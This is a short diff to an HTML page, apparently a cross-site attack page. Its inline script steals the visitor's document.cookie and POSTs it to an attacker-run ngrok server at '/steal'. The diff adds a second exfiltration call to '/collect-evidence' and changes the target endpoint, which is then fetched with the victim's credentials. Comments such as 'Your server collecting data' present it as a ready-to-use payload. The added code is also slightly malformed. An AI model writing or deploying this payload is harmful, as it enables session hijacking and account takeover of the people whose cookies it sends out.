@@ -7,11 +7,11 @@
 
   <script>
     (function() {
-      const attackerServer = "https://your.ngrok.app"; // Your server collecting data
-      const targetUrl = "https://foo.bar/api/v2/token"; // Endpoint on target site
+      const attackerServer = "https://your-server.ngrok.app/"; // Your server collecting data
+      const targetUrl = "https://example.com/account/tickets/"; // Endpoint on target site
 
     (async () => {
-      const STEAL = "https://your.ngrok.app/steal";
+      const STEAL = "https://your-server.ngrok.app/steal";
       const cookies = document.cookie;
       if (cookies) {
         await fetch(STEAL, {
@@ -23,6 +23,12 @@
       }
     })();
 
+    fetch('https://your-server.ngrok.app/collect-evidence', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookies: document.cookie }),
+      credentials: 'include'
+    })
       // Fetch target URL with credentials to send cookies
       fetch(targetUrl, {
         method: 'GET',
@@ -44,3 +50,4 @@
   </script>
 </body>
 </html>
+
